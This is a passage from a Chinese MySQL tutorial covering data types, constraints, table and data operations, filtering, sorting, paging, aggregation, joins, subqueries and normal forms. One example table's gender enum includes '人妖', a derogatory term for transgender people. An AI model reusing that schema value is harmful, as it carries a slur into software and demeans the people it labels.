此字段的值不允许重复.</li><li>默认 default: 当不填写字段对应的值会使用默认值，如果填写时以填写为准.</li><li>外键 foreign key: 对关系字段进行约束, 当为关系字段填写值时, 会到关联的表中查询此值是否存在, 如果存在则填写成功, 如果不存在则填写失败并抛出异常.</li></ul><h4 id="4-3-数据类型附录表"><a href="#4-3-数据类型附录表" class="headerlink" title="4.3 数据类型附录表"></a>4.3 数据类型附录表</h4><h5 id="4-3-1-整数类型"><a href="#4-3-1-整数类型" class="headerlink" title="4.3.1 整数类型"></a>4.3.1 整数类型</h5><table><thead><tr><th align="left">类型</th><th align="left">字节大小</th><th align="left">有符号范围(Signed)</th><th align="left">无符号范围(Unsigned)</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1</td><td align="left">-128 ~ 127</td><td align="left">0 ~ 255</td></tr><tr><td align="left">SMALLINT</td><td align="left">2</td><td align="left">-32768 ~ 32767</td><td align="left">0 ~ 65535</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3</td><td align="left">-8388608 ~ 8388607</td><td align="left">0 ~ 16777215</td></tr><tr><td align="left">INT/INTEGER</td><td align="left">4</td><td align="left">-2147483648 ~2147483647</td><td align="left">0 ~ 4294967295</td></tr><tr><td align="left">BIGINT</td><td align="left">8</td><td align="left">-9223372036854775808 ~ 9223372036854775807</td><td align="left">0 ~ 18446744073709551615</td></tr></tbody></table><h5 id="4-3-2-字符串"><a href="#4-3-2-字符串" class="headerlink" title="4.3.2 字符串"></a>4.3.2 字符串</h5><table><thead><tr><th align="left">类型</th><th align="left">说明</th><th align="left">使用场景</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">固定长度，小型数据</td><td align="left">身份证号、手机号、电话、密码</td></tr><tr><td align="left">VARCHAR</td><td align="left">可变长度，小型数据</td><td align="left">姓名、地址、品牌、型号</td></tr><tr><td align="left">TEXT</td><td align="left">可变长度，字符个数大于 4000</td><td align="left">存储小型文章或者新闻</td></tr><tr><td align="left">LONGTEXT</td><td align="left">可变长度， 极大型文本数据</td><td align="left">存储极大型文本数据</td></tr></tbody></table><h5 id="4-3-3-时间类型"><a href="#4-3-3-时间类型" class="headerlink" title="4.3.3 时间类型"></a>4.3.3 时间类型</h5><table><thead><tr><th align="left">类型</th><th align="left">字节大小</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">4</td><td align="left">‘2020-01-01’</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘12:29:59’</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">‘2020-01-01 12:29:59’</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">‘2017’</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">‘1970-01-01 00:00:01’ UTC ~ ‘2038-01-01 00:00:01’ UTC</td></tr></tbody></table><h5 id="4-3-4-小结"><a href="#4-3-4-小结" class="headerlink" title="4.3.4 小结"></a>4.3.4 小结</h5><ul><li>常用的数据类型:<ul><li>整数：int，bit</li><li>小数：decimal</li><li>字符串：varchar,char</li><li>日期时间: date, time, datetime</li><li>枚举类型(enum)</li></ul></li><li>常见的约束:<ul><li>主键约束 primary key</li><li>非空约束 not null</li><li>惟一约束 unique</li><li>默认约束 default</li><li>外键约束 foreign key</li></ul></li><li>数据类型和约束保证了表中数据的准确性和完整性</li></ul><h3 id="5-命令行客户端MySQL的使用"><a href="#5-命令行客户端MySQL的使用" class="headerlink" title="5.命令行客户端MySQL的使用"></a>5.命令行客户端MySQL的使用</h3><h4 id="5-1-登录和登出数据库"><a href="#5-1-登录和登出数据库" class="headerlink" title="5.1 登录和登出数据库"></a>5.1 登录和登出数据库</h4><p><strong>登录数据库:</strong></p><p>输入下面命令:</p><pre><code class="bash">mysql -uroot -p</code></pre><p><strong>说明:</strong></p><ul><li>-u 后面是登录的用户名</li><li>-p 后面是登录密码, 如果不填写, 回车之后会提示输入密码</li></ul><p><strong>登录成功后, 输入如下命令查看效果：</strong></p><pre><code class="sql"># 显示当前时间select now();</code></pre><p><strong>登出(退出)数据库:</strong></p><pre><code class="sql">quit 或 exit 或 ctrl + d</code></pre><h4 id="5-2-数据库操作的SQL语句"><a href="#5-2-数据库操作的SQL语句" class="headerlink" title="5.2 数据库操作的SQL语句"></a>5.2 数据库操作的SQL语句</h4><ol><li><p>查看所有数据库</p><pre><code class="sql">show databases;</code></pre></li><li><p>创建数据库</p><pre><code class="sql">create database 数据库名 charset=utf8;例：create database python charset=utf8;</code></pre></li><li><p>使用数据库</p><pre><code class="sql">use 数据库名;</code></pre></li><li><p>查看当前使用的数据库</p><pre><code class="sql">select database();</code></pre></li><li><p>删除数据库-慎重</p><pre><code class="sql">drop database 数据库名;例：drop database python;</code></pre></li></ol><h4 id="5-3-表结构操作的SQL语句"><a href="#5-3-表结构操作的SQL语句" class="headerlink" title="5.3 表结构操作的SQL语句"></a>5.3 表结构操作的SQL语句</h4><ol><li><p>查看当前数据库中所有表</p><pre><code class="sql">show tables;</code></pre></li><li><p>创建表</p><pre><code class="sql">create table students( id int unsigned primary key auto_increment not null, name varchar(20) not null, age tinyint unsigned default 0, height decimal(5,2), gender enum(&#39;男&#39;,&#39;女&#39;,&#39;人妖&#39;,&#39;保密&#39;) default &#39;保密&#39;);</code></pre><p><strong>说明:</strong></p><pre><code class="sql">create table 表名(字段名称 数据类型  可选的约束条件,column1 datatype contrai,...);</code></pre></li><li><p>修改表-添加字段</p><pre><code class="sql">alter table 表名 add 列名 类型 约束;例：alter table students add birthday datetime;</code></pre></li><li><p>修改表-修改字段类型</p><pre><code class="sql">alter table 表名 modify 列名 类型 约束;例：alter table students modify birthday date not null;</code></pre><p><strong>说明:</strong></p><ul><li>modify: 只能修改字段类型或者约束，不能修改字段名</li></ul></li><li><p>修改表-修改字段名和字段类型</p><pre><code class="sql">alter table 表名 change 原名 新名 类型及约束;例：alter table students change birthday birth datetime not null;</code></pre><p><strong>说明:</strong></p><ul><li>change: 既能对字段重命名又能修改字段类型还能修改约束</li></ul></li><li><p>修改表-删除字段</p><pre><code class="sql">alter table 表名 drop 列名;例：alter table students drop birthday;</code></pre></li><li><p>查看创表SQL语句</p><pre><code class="sql">show create table 表名;例：show create table students;</code></pre></li><li><p>查看创库SQL语句</p><pre><code class="sql">show create database 数据库名;例：show create database mytest;</code></pre></li><li><p>删除表</p><pre><code class="sql">drop table 表名;例：drop table students;</code></pre></li></ol><h4 id="5-4-表数据操作的SQL语句"><a href="#5-4-表数据操作的SQL语句" class="headerlink" title="5.4 表数据操作的SQL语句"></a>5.4 表数据操作的SQL语句</h4><ol><li><p>查询数据</p><pre><code class="sql">-- 1. 查询所有列select * from 表名;例：select * from students;-- 2. 查询指定列select 列1,列2,... from 表名;例：select id,name from students;</code></pre></li><li><p>添加数据</p><pre><code class="sql">-- 1. 全列插入：值的顺序与表结构字段的顺序完全一一对应insert into 表名 values (...)例:insert into students values(0, &#39;xx&#39;, default, default, &#39;男&#39;);-- 2. 部分列插入：值的顺序与给出的列顺序对应insert into 表名 (列1,...) values(值1,...)例:insert into students(name, age) values(&#39;王二小&#39;, 15);-- 3. 全列多行插入insert into 表名 values(...),(...)...;例:insert into students values(0, &#39;张飞&#39;, 55, 1.75, &#39;男&#39;),(0, &#39;关羽&#39;, 58, 1.85, &#39;男&#39;);-- 4. 部分列多行插入insert into 表名(列1,...) values(值1,...),(值1,...)...;例：insert into students(name, height) values(&#39;刘备&#39;, 1.75),(&#39;曹操&#39;, 1.6);</code></pre><p><strong>说明:</strong></p><ul><li>主键列是自动增长，但是在全列插入时需要占位，通常使用空值(0或者null或者default)</li><li>在全列插入时，如果字段列有默认值可以使用 default 来占位，插入后的数据就是之前设置的默认值</li></ul></li><li><p>修改数据</p><pre><code class="sql">update 表名 set 列1=值1,列2=值2... where 条件例：update students set age = 18, gender = &#39;女&#39; where id = 6;</code></pre></li><li><p>删除数据</p><pre><code class="sql">delete from 表名 where 条件例：delete from students where id=5;</code></pre><p>问题:</p><p>上面的操作称之为物理删除，一旦删除就不容易恢复，我们可以使用逻辑删除的方式来解决这个问题。</p><pre><code class="sql">-- 添加删除表示字段，0表示未删除 1表示删除alter table students add isdelete bit default 0;-- 逻辑删除数据update students set isdelete = 1 where id = 8;</code></pre><p><strong>说明:</strong></p><ul><li>逻辑删除，本质就是修改操作</li></ul></li></ol><h3 id="6-as和distinct关键字"><a href="#6-as和distinct关键字" class="headerlink" title="6.as和distinct关键字"></a>6.as和distinct关键字</h3><h4 id="6-1-as关键字"><a href="#6-1-as关键字" class="headerlink" title="6.1 as关键字"></a>6.1 as关键字</h4><p>在使用SQL语句显示结果的时候，往往在屏幕显示的字段名并不具备良好的可读性，此时可以使用 as 给字段起一个别名。</p><ol><li><p>使用 as 给字段起别名</p><pre><code class="sql">select id as 序号, name as 名字, gender as 性别 from students;</code></pre></li><li><p>可以通过 as 给表起别名</p><pre><code class="sql">-- 如果是单表查询 可以省略表名select id, name, gender from students;-- 表名.字段名select students.id,students.name,students.gender from students;-- 可以通过 as 给表起别名 select s.id,s.name,s.gender from students as s;</code></pre></li></ol><h4 id="6-2-distinct关键字"><a href="#6-2-distinct关键字" class="headerlink" title="6.2 distinct关键字"></a>6.2 distinct关键字</h4><p>distinct可以去除重复数据行。</p><pre><code class="sql">select distinct 列1,... from 表名;例： 查询班级中学生的性别select name, gender from students;-- 看到了很多重复数据 想要对其中重复数据行进行去重操作可以使用 distinctselect distinct name, gender from students;</code></pre><h3 id="7-where条件查询"><a href="#7-where条件查询" class="headerlink" title="7.where条件查询"></a>7.where条件查询</h3><h4 id="7-1-where条件查询的介绍"><a href="#7-1-where条件查询的介绍" class="headerlink" title="7.1 where条件查询的介绍"></a>7.1 where条件查询的介绍</h4><p>使用where条件查询可以对表中的数据进行筛选，条件成立的记录会出现在结果集中。</p><p><strong>where语句支持的运算符:</strong></p><ol><li>比较运算符</li><li>逻辑运算符</li><li>模糊查询</li><li>范围查询</li><li>空判断</li></ol><p><strong>where条件查询语法格式如下:</strong></p><pre><code class="sql">select * from 表名 where 条件;例：select * from students where id = 1;</code></pre><h4 id="7-2-比较运算符查询"><a href="#7-2-比较运算符查询" class="headerlink" title="7.2 比较运算符查询"></a>7.2 比较运算符查询</h4><ol><li>等于: =</li><li>大于: &gt;</li><li>大于等于: &gt;=</li><li>小于: &lt;</li><li>小于等于: &lt;=</li><li>不等于: != 或 &lt;&gt;</li></ol><p><strong>例1：查询编号大于3的学生:</strong></p><pre><code class="sql">select * from students where id &gt; 3;</code></pre><p><strong>例2：查询编号不大于4的学生:</strong></p><pre><code class="sql">select * from students where id &lt;= 4;</code></pre><p><strong>例3：查询姓名不是“黄蓉”的学生:</strong></p><pre><code class="sql">select * from students where name != &#39;黄蓉&#39;;</code></pre><p><strong>例4：查询没被删除的学生:</strong></p><pre><code class="sql">select * from students where is_delete=0;</code></pre><h4 id="7-3-逻辑运算符查询"><a href="#7-3-逻辑运算符查询" class="headerlink" title="7.3 逻辑运算符查询"></a>7.3 逻辑运算符查询</h4><ol><li>and</li><li>or</li><li>not</li></ol><p><strong>例1：查询编号大于3的女同学:</strong></p><pre><code class="sql">select * from students where id &gt; 3 and gender=0;</code></pre><p><strong>例2：查询编号小于4或没被删除的学生:</strong></p><pre><code class="sql">select * from students where id &lt; 4 or is_delete=0;</code></pre><p><strong>例3：查询年龄不在10岁到15岁之间的学生:</strong></p><pre><code class="sql">select * from students where not (age &gt;= 10 and age &lt;= 15);</code></pre><p><strong>说明:</strong></p><ul><li>多个条件判断想要作为一个整体，可以结合‘()’。</li></ul><h4 id="7-4-模糊查询"><a href="#7-4-模糊查询" class="headerlink" title="7.4 模糊查询"></a>7.4 模糊查询</h4><ol><li>like是模糊查询关键字</li><li>%表示任意多个任意字符</li><li>_表示一个任意字符</li></ol><p><strong>例1：查询姓黄的学生:</strong></p><pre><code class="sql">select * from students where name like &#39;黄%&#39;;</code></pre><p><strong>例2：查询姓黄并且“名”是一个字的学生:</strong></p><pre><code class="sql">select * from students where name like &#39;黄_&#39;;</code></pre><p><strong>例3：查询姓黄或叫靖的学生:</strong></p><pre><code class="sql">select * from students where name like &#39;黄%&#39; or name like &#39;%靖&#39;;</code></pre><h4 id="7-5-范围查询"><a href="#7-5-范围查询" class="headerlink" title="7.5 范围查询"></a>7.5 范围查询</h4><ol><li>between .. and .. 表示在一个连续的范围内查询</li><li>in 表示在一个非连续的范围内查询</li></ol><p><strong>例1：查询编号为3至8的学生:</strong></p><pre><code class="sql">select * from students where id between 3 and 8;</code></pre><p><strong>例2：查询编号不是3至8的男生:</strong></p><pre><code>select * from students where (not id between 3 and 8) and gender=&#39;男&#39;;</code></pre><h4 id="7-6-空判断查询"><a href="#7-6-空判断查询" class="headerlink" title="7.6 空判断查询"></a>7.6 空判断查询</h4><ol><li>判断为空使用: is null</li><li>判断非空使用: is not null</li></ol><p><strong>例1：查询没有填写身高的学生:</strong></p><pre><code class="sql">select * from students where height is null;</code></pre><p><strong>注意:</strong></p><ol><li>不能使用 where height = null 判断为空</li><li>不能使用 where height != null 判断非空</li><li>null 不等于 ‘’ 空字符串</li></ol><h3 id="8-排序"><a href="#8-排序" class="headerlink" title="8.排序"></a>8.排序</h3><h4 id="8-1-排序查询语法"><a href="#8-1-排序查询语法" class="headerlink" title="8.1 排序查询语法"></a>8.1 排序查询语法</h4><p>排序查询语法：</p><pre><code class="sql">select * from 表名 order by 列1 asc|desc [,列2 asc|desc,...]</code></pre><p><strong>语法说明:</strong></p><ol><li>先按照列1进行排序，如果列1的值相同时，则按照 列2 排序，以此类推</li><li>asc从小到大排列，即升序</li><li>desc从大到小排序，即降序</li><li>默认按照列值从小到大排序（即asc关键字）</li></ol><p><strong>例1：查询未删除男生信息，按学号降序:</strong></p><pre><code class="sql">select * from students where gender=1 and is_delete=0 order by id desc;</code></pre><p><strong>例2：显示所有的学生信息，先按照年龄从大–&gt;小排序，当年龄相同时 按照身高从高–&gt;矮排序:</strong></p><pre><code class="sql">select * from students  order by age desc,height desc;</code></pre><p>小结：</p><ol><li>排序使用 order by 关键字</li><li>asc 表示升序</li><li>desc 表示降序</li></ol><h3 id="9-分页查询"><a href="#9-分页查询" class="headerlink" title="9.分页查询"></a>9.分页查询</h3><h4 id="9-1-分页查询的介绍"><a href="#9-1-分页查询的介绍" class="headerlink" title="9.1 分页查询的介绍"></a>9.1 分页查询的介绍</h4><p>当我们在京东购物，浏览商品列表的时候，由于数据特别多，一页显示不完，一页一页的进行显示，这就是分页查询</p><h4 id="9-2-分页查询的语法"><a href="#9-2-分页查询的语法" class="headerlink" title="9.2 分页查询的语法"></a>9.2 分页查询的语法</h4><pre><code class="sql">select * from 表名 limit start,count</code></pre><p><strong>说明:</strong></p><ol><li>limit是分页查询关键字</li><li>start表示开始行索引，默认是0</li><li>count表示查询条数</li></ol><p><strong>例1：查询前3行男生信息:</strong></p><pre><code class="sql">select * from students where gender=1 limit 0,3;简写select * from students where gender=1 limit 3;</code></pre><h4 id="9-3-分页查询案例"><a href="#9-3-分页查询案例" class="headerlink" title="9.3 分页查询案例"></a>9.3 分页查询案例</h4><p>已知每页显示m条数据，求第n页显示的数据</p><p>提示: 关键是求每页的开始行索引</p><p><strong>查询学生表，获取第n页数据的SQL语句:</strong></p><pre><code class="sql">select * from students limit (n-1)*m,m</code></pre><h2 id="二、MySQL数据库的条件查询"><a href="#二、MySQL数据库的条件查询" class="headerlink" title="二、MySQL数据库的条件查询"></a>二、MySQL数据库的条件查询</h2><h3 id="1-聚合函数"><a href="#1-聚合函数" class="headerlink" title="1.聚合函数"></a>1.聚合函数</h3><h4 id="1-1-聚合函数的介绍"><a href="#1-1-聚合函数的介绍" class="headerlink" title="1.1 聚合函数的介绍"></a>1.1 聚合函数的介绍</h4><p>聚合函数又叫组函数，通常是对表中的数据进行统计和计算，一般结合分组(group by)来使用，用于统计和计算分组数据。</p><p><strong>常用的聚合函数:</strong></p><ol><li>count(col): 表示求指定列的总行数</li><li>max(col): 表示求指定列的最大值</li><li>min(col): 表示求指定列的最小值</li><li>sum(col): 表示求指定列的和</li><li>avg(col): 表示求指定列的平均值</li></ol><h4 id="1-2-求总行数"><a href="#1-2-求总行数" class="headerlink" title="1.2 求总行数"></a>1.2 求总行数</h4><pre><code class="sql">-- 返回非NULL数据的总行数.select count(height) from students; -- 返回总行数，包含null值记录;select count(*) from students;</code></pre><h4 id="1-3-求最大值"><a href="#1-3-求最大值" class="headerlink" title="1.3 求最大值"></a>1.3 求最大值</h4><pre><code class="sql">-- 查询女生的编号最大值select max(id) from students where gender = 2;</code></pre><h4 id="1-4-求最小值"><a href="#1-4-求最小值" class="headerlink" title="1.4 求最小值"></a>1.4 求最小值</h4><pre><code class="sql">-- 查询未删除的学生最小编号select min(id) from students where is_delete = 0;</code></pre><h4 id="1-5-求和"><a href="#1-5-求和" class="headerlink" title="1.5 求和"></a>1.5 求和</h4><pre><code class="sql">-- 查询男生的总身高select sum(height) from students where gender = 1;-- 平均身高select sum(height) / count(*) from students where gender = 1;</code></pre><h4 id="1-6-求平均值"><a href="#1-6-求平均值" class="headerlink" title="1.6 求平均值"></a>1.6 求平均值</h4><pre><code class="sql">-- 求男生的平均身高, 聚合函数不统计null值，平均身高有误select avg(height) from students where gender = 1;-- 求男生的平均身高, 包含身高是null的select avg(ifnull(height,0)) from students where gender = 1;</code></pre><p><strong>说明</strong></p><ul><li>ifnull函数: 表示判断指定字段的值是否为null，如果为空使用自己提供的值。</li></ul><h4 id="1-7-聚合函数的特点"><a href="#1-7-聚合函数的特点" class="headerlink" title="1.7 聚合函数的特点"></a>1.7 聚合函数的特点</h4><ul><li>聚合函数默认忽略字段为null的记录 要想列值为null的记录也参与计算，必须使用ifnull函数对null值做替换。</li></ul><h3 id="2-分组查询"><a href="#2-分组查询" class="headerlink" title="2. 分组查询"></a>2. 分组查询</h3><ul><li>group by 根据指定的一个或者多个字段对数据进行分组</li><li>group_concat(字段名)函数是统计每个分组指定字段的信息集合</li><li>聚合函数在和 group by 结合使用时, 聚合函数统计和计算的是每个分组的数据</li><li>having 是对分组数据进行条件过滤</li><li>with rollup在最后记录后面新增一行，显示select查询时聚合函数的统计和计算结果</li></ul><h4 id="2-1-分组查询介绍"><a href="#2-1-分组查询介绍" class="headerlink" title="2.1 分组查询介绍"></a>2.1 分组查询介绍</h4><p>分组查询就是将查询结果按照指定字段进行分组，字段中数据相等的分为一组。</p><p><strong>分组查询基本的语法格式如下：</strong></p><p>GROUP BY 列名 [HAVING 条件表达式] [WITH ROLLUP]</p><p><strong>说明:</strong></p><ul><li>列名: 是指按照指定字段的值进行分组。</li><li>HAVING 条件表达式: 用来过滤分组后的数据。</li><li>WITH ROLLUP：在所有记录的最后加上一条记录，显示select查询时聚合函数的统计和计算结果</li></ul><h4 id="2-2-group-by的使用"><a href="#2-2-group-by的使用" class="headerlink" title="2.2 group by的使用"></a>2.2 group by的使用</h4><p>group by可用于单个字段分组，也可用于多个字段分组</p><pre><code class="sql">-- 根据gender字段来分组select gender from students group by gender;-- 根据name和gender字段进行分组select name, gender from students group by name, gender;</code></pre><h4 id="2-3-group-by-group-concat-的使用"><a href="#2-3-group-by-group-concat-的使用" class="headerlink" title="2.3 group by + group_concat()的使用"></a>2.3 group by + group_concat()的使用</h4><p>group_concat(字段名): 统计每个分组指定字段的信息集合，每个信息之间使用逗号进行分割</p><pre><code class="sql">-- 根据gender字段进行分组， 查询gender字段和分组的name字段信息select gender,group_concat(name) from students group by gender;</code></pre><h4 id="2-4-group-by-聚合函数的使用"><a href="#2-4-group-by-聚合函数的使用" class="headerlink" title="2.4 group by + 聚合函数的使用"></a>2.4 group by + 聚合函数的使用</h4><pre><code class="sql">-- 统计不同性别的人的平均年龄select gender,avg(age) from students group by gender;-- 统计不同性别的人的个数select gender,count(*) from students group by gender;</code></pre><h4 id="2-5-group-by-having的使用"><a href="#2-5-group-by-having的使用" class="headerlink" title="2.5 group by + having的使用"></a>2.5 group by + having的使用</h4><p>having作用和where类似都是过滤数据的，但having是过滤分组数据的，只能用于group by</p><pre><code class="sql">-- 根据gender字段进行分组，统计分组条数大于2的select gender,count(*) from students group by gender having count(*)&gt;2;</code></pre><h4 id="2-6-group-by-with-rollup的使用"><a href="#2-6-group-by-with-rollup的使用" class="headerlink" title="2.6 group by + with rollup的使用"></a>2.6 group by + with rollup的使用</h4><p>with rollup的作用是：在最后记录后面新增一行，显示select查询时聚合函数的统计和计算结果</p><pre><code class="sql">-- 根据gender字段进行分组，汇总总人数select gender,count(*) from students group by gender with rollup;-- 根据gender字段进行分组，汇总所有人的年龄select gender,group_concat(age) from students group by gender with rollup;</code></pre><h3 id="3-连接查询-内连接"><a href="#3-连接查询-内连接" class="headerlink" title="3.连接查询-内连接"></a>3.连接查询-内连接</h3><ul><li>内连接使用inner join .. on .., on 表示两个表的连接查询条件</li><li>内连接根据连接查询条件取出两个表的 “交集”</li></ul><h4 id="3-1-连接查询的介绍"><a href="#3-1-连接查询的介绍" class="headerlink" title="3.1 连接查询的介绍"></a>3.1 连接查询的介绍</h4><p>连接查询可以实现多个表的查询，当查询的字段数据来自不同的表就可以使用连接查询来完成。</p><p>连接查询可以分为:</p><ol><li>内连接查询</li><li>左连接查询</li><li>右连接查询</li><li>自连接查询</li></ol><h4 id="3-2-内连接查询"><a href="#3-2-内连接查询" class="headerlink" title="3.2 内连接查询"></a>3.2 内连接查询</h4><p>查询两个表中符合条件的共有记录</p><p><strong>内连接查询效果图:</strong></p><p><img src="https://img-blog.csdnimg.cn/20200826140225147.png#pic_center" alt="在这里插入图片描述"></p><p><strong>内连接查询语法格式:</strong></p><pre><code class="sql">select 字段 from 表1 inner join 表2 on 表1.字段1 = 表2.字段2</code></pre><p><strong>说明:</strong></p><ul><li>inner join 就是内连接查询关键字</li><li>on 就是连接查询条件</li></ul><p><strong>例1：使用内连接查询学生表与班级表:</strong></p><pre><code class="sql">select * from students as s inner join classes as c on s.cls_id = c.id;</code></pre><h3 id="4-连接查询-左连接"><a href="#4-连接查询-左连接" class="headerlink" title="4.连接查询-左连接"></a>4.连接查询-左连接</h3><ul><li>左连接使用left join .. on .., on 表示两个表的连接查询条件</li><li>左连接以左表为主根据条件查询右表数据，右表数据不存在使用null值填充。</li></ul><h4 id="4-1-左连接查询"><a href="#4-1-左连接查询" class="headerlink" title="4.1 左连接查询"></a>4.1 左连接查询</h4><p>以左表为主根据条件查询右表数据，如果根据条件查询右表数据不存在使用null值填充</p><p><strong>左连接查询效果图:</strong></p><p><img src="https://img-blog.csdnimg.cn/20200826140206298.png#pic_center" alt="在这里插入图片描述"></p><p><strong>左连接查询语法格式:</strong></p><pre><code class="sql">select 字段 from 表1 left join 表2 on 表1.字段1 = 表2.字段2</code></pre><p><strong>说明:</strong></p><ul><li>left join 就是左连接查询关键字</li><li>on 就是连接查询条件</li><li>表1 是左表</li><li>表2 是右表</li></ul><p><strong>例1：使用左连接查询学生表与班级表:</strong></p><pre><code class="sql">select * from students as s left join classes as c on s.cls_id = c.id;</code></pre><h3 id="5-连接查询-右连接"><a href="#5-连接查询-右连接" class="headerlink" title="5.连接查询-右连接"></a>5.连接查询-右连接</h3><ul><li>右连接使用right join .. on .., on 表示两个表的连接查询条件</li><li>右连接以右表为主根据条件查询左表数据，左表数据不存在使用null值填充。</li></ul><h4 id="5-1-右连接查询"><a href="#5-1-右连接查询" class="headerlink" title="5.1 右连接查询"></a>5.1 右连接查询</h4><p>以右表为主根据条件查询左表数据，如果根据条件查询左表数据不存在使用null值填充</p><p><strong>右连接查询效果图:</strong></p><p><img src="https://img-blog.csdnimg.cn/20200826140058482.png#pic_center" alt="右连接"></p><p><strong>右连接查询语法格式:</strong></p><pre><code class="sql">select 字段 from 表1 right join 表2 on 表1.字段1 = 表2.字段2</code></pre><p><strong>说明:</strong></p><ul><li>right join 就是右连接查询关键字</li><li>on 就是连接查询条件</li><li>表1 是左表</li><li>表2 是右表</li></ul><p><strong>例1：使用右连接查询学生表与班级表:</strong></p><pre><code class="sql">select * from students as s right join classes as c on s.cls_id = c.id;</code></pre><h3 id="6-连接查询-自连接"><a href="#6-连接查询-自连接" class="headerlink" title="6.连接查询-自连接"></a>6.连接查询-自连接</h3><ul><li>自连接查询就是把一张表模拟成左右两张表，然后进行连表查询。</li><li>自连接就是一种特殊的连接方式，连接的表还是本身这张表</li></ul><h4 id="6-1-自连接查询"><a href="#6-1-自连接查询" class="headerlink" title="6.1 自连接查询"></a>6.1 自连接查询</h4><p>左表和右表是同一个表，根据连接查询条件查询两个表中的数据。</p><p><strong>自连接查询的用法:</strong></p><pre><code class="sql">select c.title, c.pid, p.id, p.title from areas as c inner join areas as p on c.pid = p.id where p.title = &#39;目标&#39;;</code></pre><p><strong>说明:</strong></p><ul><li><strong>自连接查询必须对表起别名</strong></li></ul><p><strong>这个直连接没有配图说明，可能会难以理解</strong></p><h3 id="7-子查询"><a href="#7-子查询" class="headerlink" title="7.子查询"></a>7.子查询</h3><h4 id="7-1-子查询的介绍"><a href="#7-1-子查询的介绍" class="headerlink" title="7.1 子查询的介绍"></a>7.1 子查询的介绍</h4><p>在一个 select 语句中,嵌入了另外一个 select 语句, 那么被嵌入的 select 语句称之为子查询语句，外部那个select语句则称为主查询.</p><p><strong>主查询和子查询的关系:</strong></p><ol><li>子查询是嵌入到主查询中</li><li>子查询是辅助主查询的,要么充当条件,要么充当数据源</li><li>子查询是可以独立存在的语句,是一条完整的 select 语句</li></ol><h4 id="7-2-子查询的使用"><a href="#7-2-子查询的使用" class="headerlink" title="7.2 子查询的使用"></a>7.2 子查询的使用</h4><p><strong>例1. 查询大于平均年龄的学生:</strong></p><pre><code class="sql">select * from students where age &gt; (select avg(age) from students);</code></pre><p><strong>例2. 查询学生在班的所有班级名字:</strong></p><pre><code class="sql">select name from classes where id in (select cls_id from students where cls_id is not null);</code></pre><p><strong>例3. 查找年龄最大,身高最高的学生:</strong></p><pre><code class="sql">select * from students where (age, height) =  (select max(age), max(height) from students);</code></pre><h4 id="7-3-小结"><a href="#7-3-小结" class="headerlink" title="7.3 小结"></a>7.3 小结</h4><ul><li>子查询是一个完整的SQL语句，子查询被嵌入到一对小括号里面</li></ul><h3 id="8-数据库设计之三范式"><a href="#8-数据库设计之三范式" class="headerlink" title="8.数据库设计之三范式"></a>8.数据库设计之三范式</h3><h4 id="8-1-数据库设计之三范式的介绍"><a href="#8-1-数据库设计之三范式的介绍" class="headerlink" title="8.1 数据库设计之三范式的介绍"></a>8.1 数据库设计之三范式的介绍</h4><p>范式: 对设计数据库提出的一些规范，目前有迹可寻的共有8种范式，一般遵守3范式即可。</p><ul><li>第一范式（1NF）: 强调的是列的原子性，即列不能够再分成其他几列。</li><li>第二范式（2NF）: 满足 1NF，另外包含两部分内容，一是表必须有一个主键；二是非主键字段 必须完全依赖于主键，而不能只依赖于主键的一部分。</li><li>第三范式（3NF）: 满足 2NF，另外非主键列必须直接依赖于主键，不能存在传递依赖。即不能存在：非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况。</li></ul><h4 id="8-2-E-R模型的介绍"><a href="#8-2-E-R模型的介绍" class="headerlink" title="8.2 E-R模型的介绍"></a>8.2 E-R模型的介绍</h4><ul><li>E-R模型由 实体、属性、实体之间的关系构成，主要用来描述数据库中表结构。</li><li>开发流程是先画出E-R模型，然后根据三范式设计数据库中的表结构</li></ul><p>E-R模型即实体-关系模型，E-R模型就是描述数据库存储数据的结构模型。</p><p><strong>E-R模型的使用场景:</strong></p><ol><li>对于大型公司开发项目，我们需要根据产品经理的设计，我们先使用建模工具, 如:power designer，db desinger等这些软件来画出实体-关系模型(E-R模型)</li><li>然后根据三范式设计数据库表结构</li></ol><p><strong>E-R模型的效果图:</strong><br><img src="https://img-blog.csdnimg.cn/20200826135957115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70#pic_center" alt="E-R模型的效果图"></p><p><strong>说明:</strong></p><ul><li>实体: 用矩形表示，并标注实体名称</li><li>属性: 用椭圆表示，并标注属性名称，</li><li>关系: 用菱形表示，并标注关系名称<ul><li>一对一</li><li>一对多</li><li>多对多</li></ul></li></ul><p><strong>一对多的关系:</strong></p><p><strong>说明:</strong></p><ul><li>关系也是一种数据，需要通过一个字段存储在表中</li><li>1对1关系，在表A或表B中创建一个字段，存储另一个表的主键值</li></ul><p><strong>一对多的关系:</strong></p><p><strong>说明:</strong></p><ul><li>1对多关系，在多的一方表(学生表)中创建一个字段，存储班级表的主键值</li></ul><p><strong>多对多的关系:</strong></p><p><strong>说明:</strong></p><ul><li>多对多关系，新建一张表C，这个表只有两个字段，一个用于存储A的主键值，一个用于存储B的主键值</li></ul><h3 id="9-外键SQL语句的编写"><a href="#9-外键SQL语句的编写" class="headerlink" title="9.外键SQL语句的编写"></a>9.外键SQL语句的编写</h3><ul><li>添加外键约束: alter table 从表 add foreign key(外键字段) references 主表(主键字段);</li><li>删除外键约束: alter table 表名 drop foreign key 外键名;</li></ul><h4 id="9-1-外键约束作用"><a href="#9-1-外键约束作用" class="headerlink" title="9.1 外键约束作用"></a>9.1 外键约束作用</h4><p>外键约束:对外键字段的值进行更新和插入时会和引用表中字段的数据进行验证，数据如果不合法则更新和插入会失败，保证数据的有效性</p><h4 id="9-2-对于已经存在的字段添加外键约束"><a href="#9-2-对于已经存在的字段添加外键约束" class="headerlink" title="9.2 对于已经存在的字段添加外键约束"></a>9.2 对于已经存在的字段添加外键约束</h4><pre><code class="sql">-- 为cls_id字段添加外键约束alter table students add foreign key(cls_id) references 